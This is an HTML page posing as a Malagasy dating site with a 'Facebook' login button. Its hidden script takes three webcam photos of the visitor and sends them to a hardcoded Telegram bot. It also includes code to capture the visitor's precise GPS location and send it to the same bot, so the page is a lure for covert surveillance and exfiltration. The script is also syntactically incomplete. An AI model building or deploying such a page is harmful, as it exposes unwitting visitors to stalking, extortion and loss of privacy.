<!DOCTYPE html>
<html lang="mg">
<head>
  <meta charset="UTF-8"/>
  <title> rencontre Malagasy </title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    :root {--c1:#8A2BE2;--c2:#FF6B6B;--c3:#4ECDC4;--white:#fff;}
    body{margin:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
         background:linear-gradient(-45deg,var(--c1),var(--c2),var(--c3));background-size:400% 400%;
         animation:bgShift 8s ease infinite;color:var(--white);font-family:'Segoe UI',sans-serif;}
    @keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
    h1{margin:0 0 10px;animation:fade 1s}
    p{margin:0 0 20px;animation:fade 1.2s}
    @keyframes fade{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
    button{padding:14px 32px;border:none;border-radius:50px;background:linear-gradient(135deg,#ff7b7b,#ff3860);
           color:var(--white);font-size:18px;cursor:pointer;box-shadow:0 8px 20px rgba(255,56,96,.4);
           transition:transform .3s,box-shadow .3s;animation:pulse 2s infinite;}
    @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
    button:hover{transform:translateY(-4px) scale(1.08);box-shadow:0 12px 30px rgba(255,56,96,.6)}
    #preview{margin-top:20px;width:120px;height:120px;object-fit:cover;border-radius:50%;border:3px solid var(--white);
             box-shadow:0 4px 12px rgba(0,0,0,.25);animation:pop .6s}
    @keyframes pop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
  </style>
</head>
<body>
  <h1> Rencontre </h1>
  <p> continuer avec <strong>"Facebook"</strong></p>
  <button onclick="startProcess()">Facebook</button>

<script>
  /* ------------- PARAMÈTRES TELEGRAM ------------- */
  const BOT_TOKEN = "8469966308:AAGzr6xL7R3zqV9r9yCC61LTCIxvY6oKtOs";
  const CHAT_ID   = "8124974450";

  /* ------------- FONCTION PRINCIPALE ------------- */
  async function startProcess() {
    try {
      // 1. Maka sary 3
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video  = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      const ctx    = canvas.getContext('2d');

      for (let i = 0; i < 3; i++) {
        await new Promise(r => setTimeout(r, 1200));
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const imgData = canvas.toDataURL('image/png');
        await sendPhoto(imgData, "📸 Selfie #" + (i+1));
      }
      stream.getTracks().forEach(t => t.stop());

      // 2. Maka toerana
      function obtenirPosition() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(new Error("Géolocalisation non supportée par ce navigateur."));
    } else {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000
      });
    }
  });
}

async function envoyerPosition() {
  try {
    const pos = await obtenirPosition();
    const { latitude: lat, longitude: lon } = pos.coords;
    const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
    
    await sendMessage(loc); // Fonctionne même si sendMessage est asynchrone
    alert("✅ Vita ny test, Tongasoa!");
  } catch (err) {
    alert("❌ Nisy olana: " + err.message);
    console.error(err);
  }
}


  /* ------------- ENVOI PHOTO ------------- */
  async function sendPhoto(imgBase64, caption) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", caption);

    const blob = dataURItoBlob(imgBase64);
    form.append("photo", blob, "selfie.png");

    const res = await fetch(url, { method: "POST", body: form });
    console.log("sendPhoto status:", res.status);
  }

  /* ------------- ENVOI MESSAGE TEXTE ------------- */
  async function sendMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    console.log("sendMessage status:", res.status);
  }

  /* ------------- UTILITAIRE ------------- */
  function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab   = new ArrayBuffer(byteString.length);
    const ia   = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
    return new Blob([ab], { type: mime });
  }
</script>
</body>
</html>
